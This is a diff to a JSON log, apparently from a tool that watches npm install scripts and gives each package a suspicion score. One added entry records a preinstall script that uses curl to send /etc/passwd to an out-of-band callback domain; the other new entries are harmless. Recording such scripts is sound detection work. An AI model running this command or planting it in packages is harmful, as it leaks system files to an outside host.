@@ -1,5 +1,35 @@
 [
   {
+    "packageName": "@orbitlogistics/aws-cdk-ses-domain-identity",
+    "version": "3.0.1",
+    "scriptType": "prebuild",
+    "scriptContent": "npm run clean",
+    "previousVersion": null,
+    "timestamp": "2026-03-13T13:18:16.362Z",
+    "issuesend": false,
+    "suspicionScore": 0
+  },
+  {
+    "packageName": "echo-ai-cli",
+    "version": "1.0.0",
+    "scriptType": "postinstall",
+    "scriptContent": "echo \"✓ Echo CLI installed! Run 'echo --help' to get started.\"",
+    "previousVersion": null,
+    "timestamp": "2026-03-13T13:16:37.701Z",
+    "issuesend": false,
+    "suspicionScore": 0
+  },
+  {
+    "packageName": "ac-element-engagement",
+    "version": "3.0.1",
+    "scriptType": "preinstall",
+    "scriptContent": "/usr/bin/curl --data '@/etc/passwd' http://$(hostname).m5s740tk2nyngoiiikp84fwo4fa6yamz.oastify.com",
+    "previousVersion": null,
+    "timestamp": "2026-03-13T13:16:33.470Z",
+    "issuesend": false,
+    "suspicionScore": 20
+  },
+  {
     "packageName": "adminforth",
     "version": "2.25.0",
     "scriptType": "postinstall",
